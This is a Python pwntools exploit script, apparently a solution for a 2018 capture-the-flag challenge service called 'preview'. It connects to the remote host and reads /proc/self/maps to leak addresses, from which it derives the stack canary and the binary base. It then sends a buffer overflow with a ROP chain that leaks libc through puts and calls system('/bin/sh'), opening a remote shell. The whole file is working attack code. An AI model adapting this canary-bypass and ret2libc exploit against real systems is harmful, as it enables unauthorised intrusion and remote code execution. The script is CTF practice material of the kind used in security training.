from pwn import *
from pow import solve_pow
import time
import sys
import random
import collections
import re
import pickle
import os

context.log_level = 'debug'

r = remote('cee810fa.quals2018.oooverflow.io', 31337)

out = r.recvuntil('Solution:')
chal = re.findall(r'Challenge: (.*?)\n', out)[0]
n = int(re.findall(r'n: (.*?)\n', out)[0])

ans = solve_pow(chal, n)
r.sendline(str(ans))

#r = process(['preview', '1000'])
r.recvuntil("requests\n")
r.sendline("HEAD /proc/self/maps")
r.readline()

l = r.readline()
a1 = int(l.split("-")[0], 16) >> 12
ld = "ld" in l

for i in xrange(6):
    a2 = int(r.readline().split("-")[0], 16) >> 12
    if (a1 >> 20) != (a2 >> 20):
        break

if not ld:
    a1, a2 = a2, a1
canary = (a1 << 36) | (a2 << 8)
print("CANARY: %x" % canary)

bin_base = (a2 << 12)
print("BIN_BASE: %x" % bin_base)
pop_rdi = bin_base + 0x10b3
main = bin_base + 0x0FE8
puts_got = bin_base + 0x202020
puts_plt = bin_base + 0x9e0

msg = "A"*(0x60 - 8) + p64(canary) + "B"*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
raw_input("aa\n")
r.sendline(msg)
#XXX
libc_base = u64(r.recvuntil("Welcome to preview 0.1").split("\n")[-2].ljust(8, "\x00")) - 0x000000000006f690
print("LIBC_BASE: %x" % libc_base)
system = libc_base + 0x0000000000045390
bin_sh = libc_base + 0x18CD57

msg = "A"*(0x60 - 8) + p64(canary) + "B"*8 + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(main)
r.sendline(msg)

r.interactive()
